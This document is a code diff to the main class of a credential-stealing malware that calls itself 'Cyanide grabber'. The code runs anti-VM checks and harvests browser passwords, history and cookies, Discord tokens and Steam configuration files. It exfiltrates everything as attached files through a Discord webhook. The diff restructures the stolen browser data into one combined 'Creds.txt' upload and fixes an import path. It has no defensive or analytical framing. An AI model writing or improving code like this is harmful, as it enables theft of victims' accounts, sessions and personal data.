@@ -3,17 +3,17 @@ import vdf
 import json
 import nukelib
 
-from core.componets import extractor
-from core.componets import antivm
-from core.componets import sysinfo
-from core.componets import tokengrabber
+from core.components import extractor
+from core.components import antivm
+from core.components import sysinfo
+from core.components import tokengrabber
 
 from threading import Thread
 from discord_webhook import DiscordEmbed, DiscordWebhook
 
 class Main:
     def __init__(self) -> None:
-        self.webhook = DiscordWebhook(url='%webhook%', username="Cyanide", avatar_url="https://cdn.discordapp.com/attachments/1063218191259676702/1084916459647549540/Cyanide.png")
+        self.webhook = DiscordWebhook(url='', username="Cyanide", avatar_url="https://cdn.discordapp.com/attachments/1063218191259676702/1084916459647549540/Cyanide.png")
 
     def antivm(self):
         antivm.Antivm.run()
@@ -30,9 +30,7 @@ class Main:
         return json.dumps(dataBuffer, indent=3)
 
     def browser(self):
-        password_list = []
-        history_list = []
-        cookies_list = []
+        creds = []
         for key in extractor.browsers_profile:
             browser = extractor.browsers_profile[key]
 
@@ -49,10 +47,9 @@ class Main:
                     history = extraction.extractHistory(os.path.join(browser, profile, "History"))
                     cookies = extraction.extractCookies(os.path.join(browser, profile))
 
-                    
-                    cookies_list.append(cookies)
-                    history_list.append(history)
-                    password_list.append(passwds)
+                    summary = {browser: {"Passwords": passwds, "History": history, "Cookies": cookies}}
+
+                    creds.append(summary)
 
         for key in extractor.browsers:
             browser = extractor.browsers[key]
@@ -63,11 +60,11 @@ class Main:
                 history = extraction.extractHistory(os.path.join(browser, "History"))
                 cookies = extraction.extractCookies(os.path.join(browser))
 
-                cookies_list.append(cookies)
-                history_list.append(history)
-                password_list.append(passwds)
+                summary = {browser: {"Passwords": passwds, "History": history, "Cookies": cookies}}
+
+                creds.append(summary)
         
-        return password_list, cookies_list, history_list
+        return creds
     
     def steam(self):
         steamUsersConf, steamConfigData = "None", "None"
@@ -111,7 +108,7 @@ class Main:
             pass
         
         userConfig, steamConfig = self.steam()
-        listPassword, listCookies, listHistory = self.browser()
+        listCreds = self.browser()
         tokens = self.token()
 
         for token in tokens:
@@ -140,9 +137,7 @@ class Main:
         embed.set_footer(text='By Cyanide grabber')
         self.webhook.add_file(file=str(userConfig).encode(), filename="SteamUsersConfig.txt")
         self.webhook.add_file(file=str(steamConfig).encode(), filename="SteamConfig.txt")
-        self.webhook.add_file(file=self.credsIntodict(listPassword).encode(), filename="Passwords.txt")
-        self.webhook.add_file(file=self.credsIntodict(listHistory).encode(), filename="History.txt")
-        self.webhook.add_file(file=self.credsIntodict(listCookies).encode(), filename="Cookies.txt")
+        self.webhook.add_file(file=self.credsIntodict(listCreds).encode(), filename="Creds.txt")
         self.webhook.add_embed(embed)
         r = self.webhook.execute()
 
